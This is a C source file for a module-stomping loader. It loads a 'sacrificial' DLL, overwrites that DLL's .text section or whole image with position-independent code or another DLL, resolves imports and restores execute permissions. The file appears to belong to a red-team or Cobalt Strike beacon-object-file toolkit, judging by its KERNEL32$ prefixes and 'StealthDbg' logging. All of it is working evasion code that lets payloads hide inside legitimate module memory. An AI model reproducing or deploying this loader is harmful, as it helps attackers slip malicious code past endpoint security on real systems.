#include "stomp.h"

static BOOL StompPICO( PICO_ARGS picoArgs ) {
    DWORD oldProt = 0;
    HMODULE hModule = KERNEL32$LoadLibraryExA( picoArgs.sacrificialDll, NULL, DONT_RESOLVE_DLL_REFERENCES );
    if ( !hModule ) {
        StealthDbg("ERROR: failed to load sacrificial DLL '%s'\n", picoArgs.sacrificialDll);
        return FALSE;
    }

    StealthDbg("loaded sacrificial DLL '%s' at %p\n", picoArgs.sacrificialDll, hModule);

    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)( ( ULONG_PTR ) hModule + pDosHeader->e_lfanew );
    PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION( pNtHeader );
    PVOID pTextSection = NULL;
    DWORD textSize = 0;
    for ( WORD i = 0; i < pNtHeader->FileHeader.NumberOfSections; i++ ) {
        if ( ( *( DWORD * ) pSectionHeader->Name | 0x20202020 ) == 'xet.' ) {
            pTextSection = ( PVOID )( ( ULONG_PTR ) hModule + pSectionHeader->VirtualAddress );
            textSize = pSectionHeader->Misc.VirtualSize;
            StealthDbg("found .text section at %p with size 0x%X\n", pTextSection, textSize);
            break;
        }
        pSectionHeader++;
    }

    if ( !pTextSection || textSize == 0 ) {
        StealthDbg("ERROR: failed to find .text section in sacrificial DLL\n");
        KERNEL32$VirtualFree( hModule, 0, MEM_RELEASE );
        return FALSE;
    }

    *(picoArgs.pico_dst) = (PICO*)pTextSection;

    KERNEL32$VirtualProtect( pTextSection, textSize, PAGE_READWRITE, &oldProt );
    PicoLoad( picoArgs.funcs, picoArgs.pico_src, (*picoArgs.pico_dst)->code, (*picoArgs.pico_dst)->data );

    StealthDbg("PICO loaded into sacrificial DLL, restoring .text permissions to PAGE_EXECUTE_READ\n");

    KERNEL32$VirtualProtect( (*picoArgs.pico_dst)->code, PicoCodeSize( picoArgs.pico_src ), PAGE_EXECUTE_READ, &oldProt );

    return TRUE;
}

static BOOL StompDLL( DLL_ARGS dllArgs ) {
    DWORD oldProt = 0;
    *(dllArgs.dll_dst) = (char*)KERNEL32$LoadLibraryExA( dllArgs.sacrificialDll, NULL, DONT_RESOLVE_DLL_REFERENCES );
    if ( !*(dllArgs.dll_dst) ) {
        StealthDbg("ERROR: failed to load sacrificial DLL '%s'\n", dllArgs.sacrificialDll);
        return FALSE;
    }
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)*(dllArgs.dll_dst);
    PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)( ( ULONG_PTR ) *(dllArgs.dll_dst) + pDosHeader->e_lfanew );
    DWORD dllSize = pNtHeader->OptionalHeader.SizeOfImage;
    KERNEL32$VirtualProtect( *(dllArgs.dll_dst), dllSize, PAGE_READWRITE, &oldProt );
    MSVCRT$memset( *(dllArgs.dll_dst), 0, dllSize );
    LoadDLL( dllArgs.dll_data, *(dllArgs.dll_src), *(dllArgs.dll_dst) );
    ProcessImports( dllArgs.funcs, dllArgs.dll_data, *(dllArgs.dll_dst) );

    return TRUE;
}

BOOL Stomp( STOMP_ARGS stompArgs ) {
    
    switch ( stompArgs.resourceType ) {
        case rPICO:
            StealthDbg("Stomping PICO into memory...\n");
            StealthDbg("PICO source size: code=0x%X data=0x%X\n", PicoCodeSize(stompArgs.picoArgs.pico_src), PicoDataSize(stompArgs.picoArgs.pico_src));
            return StompPICO( stompArgs.picoArgs );
        case rDLL:
            StealthDbg("Stomping DLL into memory...\n");
            StealthDbg("DLL source size: 0x%X\n", SizeOfDLL(stompArgs.dllArgs.dll_data));
            return StompDLL( stompArgs.dllArgs );
    }
    return FALSE;
}